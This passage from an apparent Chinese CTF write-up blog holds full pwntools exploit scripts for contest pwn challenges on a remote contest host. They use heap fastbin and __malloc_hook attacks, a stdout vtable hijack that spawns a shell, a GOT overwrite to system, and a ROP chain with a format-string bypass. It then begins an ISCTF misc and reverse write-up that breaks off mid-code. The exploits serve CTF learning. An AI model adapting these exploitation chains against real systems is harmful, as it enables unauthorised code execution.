class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#                b *(*main+83)</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br>io = remote(<span class="hljs-string">&quot;125.70.243.22&quot;</span>, <span class="hljs-number">31126</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    io.sendafter(<span class="hljs-string">b&quot;choice:&quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index:&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    io.sendafter(<span class="hljs-string">b&quot;size:&quot;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    io.sendafter(<span class="hljs-string">b&quot;choice:&quot;</span>, <span class="hljs-string">b&quot;2&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index:&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content:<span class="hljs-built_in">bytes</span></span>):<br>    io.sendafter(<span class="hljs-string">b&quot;choice:&quot;</span>, <span class="hljs-string">b&quot;3&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index:&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    io.sendafter(<span class="hljs-string">b&quot;length:&quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)).encode())<br>    io.sendafter(<span class="hljs-string">b&quot;content:&quot;</span>, content)<br>    <br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    io.sendafter(<span class="hljs-string">b&quot;choice:&quot;</span>, <span class="hljs-string">b&quot;4&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index:\n&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    <br>    <br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x68</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>ufd = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)) <br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(ufd)&#125;</span>&quot;</span>)<br>main_arena_offset = libc.symbols[<span class="hljs-string">&quot;__malloc_hook&quot;</span>] + <span class="hljs-number">0x10</span><br>libc_base = ufd - <span class="hljs-number">96</span> - main_arena_offset + <span class="hljs-number">8</span><br>malloc_hook = libc_base + libc.sym[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]<br>log.success(<span class="hljs-string">f&quot;mh&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(malloc_hook)&#125;</span>&quot;</span>)<br>og = libc_base + <span class="hljs-number">0xd5c07</span><br><br>stdout_vtable_ptr = libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="hljs-number">0xd8</span> + libc_base<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x80</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br><br>heap_1_addr = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br><br>log.success(<span class="hljs-string">f&quot;heap&gt;&gt;&gt;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(heap_1_addr)&#125;</span>&quot;</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x68</span>)<br>edit(<span class="hljs-number">1</span>, p64(malloc_hook-<span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x68</span>)<br>edit(<span class="hljs-number">4</span>, <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x13</span>+p64(og))<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x100</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><p>补充一下打vtable的方法。官方wp的堆布置策略有问题，会报错。<br>下面的exp打vtable时麻烦了，其实可以直接打<code>puts</code>。                                                                                                                                                                                                                                                     </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#                b *(*main+83)</span><br><span class="hljs-comment">#                c</span><br><span class="hljs-comment">#                b execve</span><br><span class="hljs-comment">#                b exit </span><br><span class="hljs-comment">#                b _IO_unbuffer_all</span><br><span class="hljs-comment">#                b _IO_cleanup</span><br><span class="hljs-comment">#                b system</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br>io = remote(<span class="hljs-string">&quot;125.70.243.22&quot;</span>, <span class="hljs-number">31287</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    io.sendafter(<span class="hljs-string">b&quot;choice:&quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index:&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    io.sendafter(<span class="hljs-string">b&quot;size:&quot;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    io.sendafter(<span class="hljs-string">b&quot;choice:&quot;</span>, <span class="hljs-string">b&quot;2&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index:&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content:<span class="hljs-built_in">bytes</span></span>):<br>    io.sendafter(<span class="hljs-string">b&quot;choice:&quot;</span>, <span class="hljs-string">b&quot;3&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index:&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    io.sendafter(<span class="hljs-string">b&quot;length:&quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)).encode())<br>    io.sendafter(<span class="hljs-string">b&quot;content:&quot;</span>, content)<br>    <br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    io.sendafter(<span class="hljs-string">b&quot;choice:&quot;</span>, <span class="hljs-string">b&quot;4&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index:\n&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    <br>    <br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x68</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>ufd = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)) <br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(ufd)&#125;</span>&quot;</span>)<br>main_arena_offset = libc.symbols[<span class="hljs-string">&quot;__malloc_hook&quot;</span>] + <span class="hljs-number">0x10</span><br>libc_base = ufd - <span class="hljs-number">96</span> - main_arena_offset + <span class="hljs-number">8</span><br>malloc_hook = libc_base + libc.sym[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]<br>log.success(<span class="hljs-string">f&quot;mh&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(malloc_hook)&#125;</span>&quot;</span>)<br>log.success(<span class="hljs-string">f&quot;libc&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)<br>xsputns = libc_base + <span class="hljs-number">0x70b60</span><br>overflow = libc_base + <span class="hljs-number">0x71880</span><br>IO_write = libc_base + <span class="hljs-number">0x70650</span><br>og = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>stdout_vtable_ptr = libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="hljs-number">0xd8</span> + libc_base<br>log.success(<span class="hljs-string">f&quot;std&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(stdout_vtable_ptr)&#125;</span>&quot;</span>)<br>fake_heap = stdout_vtable_ptr-<span class="hljs-number">0x3b</span><br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x80</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br><br>heap_1_addr = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br><br><br>fake_data = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0x00ffffffff000000</span>) + <span class="hljs-string">b&quot;\x00&quot;</span>* (<span class="hljs-number">0xb</span>+<span class="hljs-number">8</span>)+ p64(heap_1_addr+<span class="hljs-number">0x180</span>)<br>log.success(<span class="hljs-string">f&quot;heap&gt;&gt;&gt;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(heap_1_addr)&#125;</span>&quot;</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x68</span>)<br>edit(<span class="hljs-number">1</span>, p64(fake_heap))<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x100</span>)<br>fake_vtable = p64(og)* <span class="hljs-number">3</span> + p64(overflow)+ p64(og)*<span class="hljs-number">3</span>+ p64(xsputns) +p64(og)*<span class="hljs-number">3</span> +p64(og)+ p64(og)*<span class="hljs-number">3</span>  + p64(IO_write)<br>edit(<span class="hljs-number">5</span>, fake_vtable)<br>edit(<span class="hljs-number">4</span>, fake_data)<br><br>log.success(<span class="hljs-string">f&quot;std&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(stdout_vtable_ptr)&#125;</span>&quot;</span>)<br>log.success(<span class="hljs-string">f&quot;heap&gt;&gt;&gt;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(heap_1_addr)&#125;</span>&quot;</span>)<br>log.success(<span class="hljs-string">f&quot;og&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(og)&#125;</span>&quot;</span>)<br><br>add(<span class="hljs-number">6</span>, <span class="hljs-number">0x68</span>)<br>free(<span class="hljs-number">6</span>)<br>stdout_fake_heap = libc_base+libc.sym[<span class="hljs-string">&quot;_IO_2_1_stdout_&quot;</span>]-<span class="hljs-number">0x43</span><br>edit(<span class="hljs-number">6</span>, p64(stdout_fake_heap))<br>add(<span class="hljs-number">6</span>, <span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">7</span>, <span class="hljs-number">0x68</span>)<br>edit(<span class="hljs-number">7</span>, <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x33</span>+p32(<span class="hljs-number">0xfbad1880</span>)+<span class="hljs-string">b&quot;;sh;\x00&quot;</span>)<br>io.sendline(<span class="hljs-string">b&quot;5&quot;</span>)<br>io.interactive()<br><br><br></code></pre></td></tr></table></figure><h4 id="beverage-store"><a href="#beverage-store" class="headerlink" title="beverage store"></a>beverage store</h4><blockquote><p>这题容器有问题，反馈后也没修好，只能赛后加分……</p></blockquote><p>经典负数索引利用。打随机数就不赘述了，直接说攻击流程。首先篡改<code>exit</code>的got表到<code>buy</code>函数上，让程序陷入循环；再泄露<code>puts</code>地址，拿到libc基地址；再篡改<code>printf</code>got表到<code>system</code>函数上；最后篡改<code>exit</code>的got表到那个<code>printf(&quot;/bin/sh&quot;)</code>的函数上即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> ctypes<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>librand = ctypes.cdll.LoadLibrary(<span class="hljs-string">&quot;libc.so.6&quot;</span>)<br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#                b buy</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br>io = remote(<span class="hljs-string">&quot;125.70.243.22&quot;</span> ,<span class="hljs-number">31819</span>)<br>buy = <span class="hljs-number">0x40133b</span><br>backdoor = <span class="hljs-number">0x401511</span><br>io.sendafter(<span class="hljs-string">b&quot;input yours id\n&quot;</span>, <span class="hljs-string">b&quot;name&quot;</span>)<br>librand.srand(librand.time(<span class="hljs-number">0</span>)) <br>rand_byte = <span class="hljs-built_in">str</span>(librand.rand()).encode()<br>sleep(<span class="hljs-number">1</span>)<br>io.sendline(rand_byte)<br><span class="hljs-built_in">print</span>(libc.sym[<span class="hljs-string">&quot;system&quot;</span>]-libc.sym[<span class="hljs-string">&quot;puts&quot;</span>])<br>io.sendlineafter(<span class="hljs-string">b&quot;4 wine\n&quot;</span>, <span class="hljs-string">b&quot;-4&quot;</span>)<br>io.sendafter(<span class="hljs-string">b&quot;which one to choose\n&quot;</span>, p64(buy))<br><br>io.sendlineafter(<span class="hljs-string">b&quot;4 wine\n&quot;</span>, <span class="hljs-string">b&quot;-8&quot;</span>)<br>io.sendafter(<span class="hljs-string">b&quot;which one to choose\n&quot;</span>, <span class="hljs-string">b&quot;\x50&quot;</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;succeed\n&quot;</span>)<br>puts_addr = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br><br>system_addr = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>binsh_addr = <span class="hljs-number">0x4021c2</span><br><br>io.sendlineafter(<span class="hljs-string">b&quot;4 wine\n&quot;</span>, <span class="hljs-string">b&quot;-7&quot;</span>)<br>io.sendafter(<span class="hljs-string">b&quot;which one to choose\n&quot;</span>, p64(system_addr))<br><br>io.sendlineafter(<span class="hljs-string">b&quot;4 wine\n&quot;</span>, <span class="hljs-string">b&quot;-4&quot;</span>)<br>io.sendafter(<span class="hljs-string">b&quot;which one to choose\n&quot;</span>, p64(backdoor))<br>io.interactive()<br></code></pre></td></tr></table></figure><h4 id="Offensive-Security"><a href="#Offensive-Security" class="headerlink" title="Offensive_Security"></a>Offensive_Security</h4><p>先打格式化字符串绕过第一个检查。接下来是两个线程，都没加锁，数据共享，其中<code>guess</code>加载得快些，也就给了我们篡改相应值、绕过login检查的机会。 首先快速给guess发送一个1，sleep之后再给checker发一个1，就实现了绕过。<br>login成功后是一个栈溢出，考虑构造ROP链。但题目没给libc，那就只能考虑利用现有函数了。注意到<code>printer</code>函数是读取某个文件并将其内容输出，也就是说我们只需要控制<code>rdi</code>寄存器的值为<code>flag</code>字符串的地址即可。这里套用<code>fluff</code>题目的板子构造ROP链把flag写到data段上，再pop rdi即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#                b login</span><br><span class="hljs-comment">#                b vuln</span><br><span class="hljs-comment">#                b checker</span><br><span class="hljs-comment">#                b guess</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br>io = remote(<span class="hljs-string">&quot;125.70.243.22&quot;</span>, <span class="hljs-number">31982</span>)<br>printer = <span class="hljs-number">0x400647</span><br>fmt = <span class="hljs-string">b&quot;%7$lln&quot;</span><br>io.sendafter(<span class="hljs-string">b&quot;Username:\n&quot;</span>, fmt)<br>io.sendafter(<span class="hljs-string">b&quot;password: \n&quot;</span>, <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">8</span>)<br><br>io.send(<span class="hljs-string">b&quot;1\n&quot;</span>)<br>sleep(<span class="hljs-number">3</span>)<br>io.send(<span class="hljs-string">b&quot;1\n&quot;</span>)<br><br>bextr_ret = <span class="hljs-number">0x400650</span><br>xlatb_ret = <span class="hljs-number">0x40064e</span><br>pop_rdi_ret = <span class="hljs-number">0x400661</span><br>stosb_rdi_al_ret = <span class="hljs-number">0x40065f</span><br>buffer = <span class="hljs-number">0x6002c0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_rbx</span>(<span class="hljs-params">b:<span class="hljs-built_in">int</span></span>):<br>    p = <span class="hljs-string">b&quot;&quot;</span><br>    p += p64(bextr_ret)<br>    p += p64(<span class="hljs-number">0x4000</span>)<br>    p += p64(b - <span class="hljs-number">0xD093</span>)<br>    <span class="hljs-keyword">return</span> p<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_al</span>(<span class="hljs-params">a:<span class="hljs-built_in">bytes</span>,offset:<span class="hljs-built_in">int</span></span>):<br>    log.success(<span class="hljs-string">&quot;&lt;&lt;&lt;&quot;</span>)<br>    tmp = <span class="hljs-built_in">next</span>(e.search(a)) - offset<br>    log.success(<span class="hljs-string">f&quot;&gt;&gt;&gt;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(tmp)&#125;</span>, a=<span class="hljs-subst">&#123;a&#125;</span>&quot;</span>)<br>    p = p64(xlatb_ret)<br>    <span class="hljs-keyword">return</span> set_rbx(tmp) + p<br> <br>is_first = <span class="hljs-literal">True</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">save_al</span>(<span class="hljs-params">val:<span class="hljs-built_in">bytes</span>,offset:<span class="hljs-built_in">int</span></span>):<br>    <span class="hljs-keyword">global</span> is_first<br>    p = <span class="hljs-string">b&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> is_first:<br>        p += p64(pop_rdi_ret)<br>        p += p64(buffer)<br>        is_first = <span class="hljs-literal">False</span><br>    p += p64(stosb_rdi_al_ret)<br>    <span class="hljs-keyword">return</span> set_al(val,offset) + p<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_str</span>(<span class="hljs-params">s:<span class="hljs-built_in">bytes</span></span>):<br>    p=<span class="hljs-string">b&quot;&quot;</span><br>    last_al = <span class="hljs-number">0x0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>        p += save_al(p8(i),last_al)<br>        last_al = i<br>    <span class="hljs-keyword">return</span> p<br> <br> <br>payload = write_str(<span class="hljs-string">b&quot;flag&quot;</span>)<br>payload += p64(pop_rdi_ret)<br>payload += p64(buffer)<br>payload += p64(printer)<br><br>io.sendafter(<span class="hljs-string">b&quot;success!\n&quot;</span>, <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">b&quot;b&quot;</span>*<span class="hljs-number">8</span>+payload)<br>io.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ISCTFwp</title>
    <link href="/2024/11/16/ISCTFwp/"/>
    <url>/2024/11/16/ISCTFwp/</url>
    
    <content type="html"><![CDATA[<h1 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp"></a>WriteUp</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h4 id="小蓝鲨的签到01"><a href="#小蓝鲨的签到01" class="headerlink" title="小蓝鲨的签到01"></a>小蓝鲨的签到01</h4><p>扫码即得flag</p><h4 id="小蓝鲨的签到02"><a href="#小蓝鲨的签到02" class="headerlink" title="小蓝鲨的签到02"></a>小蓝鲨的签到02</h4><p>strings命令查找即得flag<br><img src="/wpsrc/misc02.png"></p><h4 id="游园地1"><a href="#游园地1" class="headerlink" title="游园地1"></a>游园地1</h4><blockquote><p>开盒题都在武汉江汉路附近，武带人狂喜</p></blockquote><p>谷歌搜图，<a href="">https://news.qq.com/rain/a/20231023A06PFW00</a> 就有个极其相似的地方，查得此地为武汉中山公园。<br>故flag为ISCTF{湖北省_武汉市_江汉区_中山公园}</p><h4 id="游园地2"><a href="#游园地2" class="headerlink" title="游园地2"></a>游园地2</h4><p>继续谷歌搜图，<a href="">https://www.taptap.cn/moment/592096524821860169</a> 有个几乎一模一样的图，看评论区知道这个是【充能国安路】的原型。<br>搜充能国安路，<a href="">https://blog.l3zc.com/2023/08/wuhan-trip/#%E5%85%85%E8%83%BD%E5%9B%BD%E5%AE%89%E8%B7%AF</a> 这里搞出了游戏名和原型街道，高德一搜竟然还是武汉江汉区的地方(<del>你们二次元是有多喜欢江汉路啊</del>)<br>得到flag:ISCTF{湖北省_武汉市_江汉区_鸣笛1988商业街_恋爱绮谭}</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h4 id="EzRe"><a href="#EzRe" class="headerlink" title="EzRe"></a>EzRe</h4><p>动调发现核心加密逻辑在这里：<br><img src="/wpsrc/re1.png" alt="alt text"><br>又知道加密后的字符串<code>QKEMK&#123;7JB5_i5_W3SllD_3z_W3&#125;</code>，直接解密即可:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs Python">key = <span class="hljs-string">&quot;ISCTF&quot;</span><br>sercet = <span class="hljs-string">&quot;QKEMK&#123;7JB5_i5_W3SllD_3z_W3&#125;&quot;</span><br>flag = []<br>j = <span class="hljs-number">0</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">(flag + key)%26 + &quot;A&quot; = QKEMK&#123;7JB5_i5_W3SllD_3z_W3&#125;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> sercet:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(i) &lt; <span 